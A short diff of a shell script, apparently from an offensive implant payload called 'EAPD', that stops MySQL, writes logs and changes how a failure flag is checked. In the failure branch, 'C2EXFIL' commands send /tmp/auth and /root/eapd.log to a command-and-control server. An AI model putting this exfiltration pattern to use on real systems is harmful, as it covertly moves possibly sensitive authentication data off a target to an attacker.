@@ -43,8 +43,7 @@ start() {
         /etc/init.d/mysqld stop && sleep 5
         printf "Stopped MySQL.\n\n" && printf "Stopped MySQL at $(date '+%r on %x')\n" >> /root/eapd.log
         printf "Log file saved to /root/eapd.log.\n\n"
-        fail="$(cat /tmp/fail)"
-        if [ "$fail" == "Yes" ]; then
+        if [ -f /tmp/fail ]; then
                 printf "EAPD Fail at $(date '+%r on %x')!!! Check Log!\n" >> /tmp/auth	
                 C2EXFIL STRING /tmp/auth FAIL
                 C2EXFIL STRING /root/eapd.log FAIL_LOG
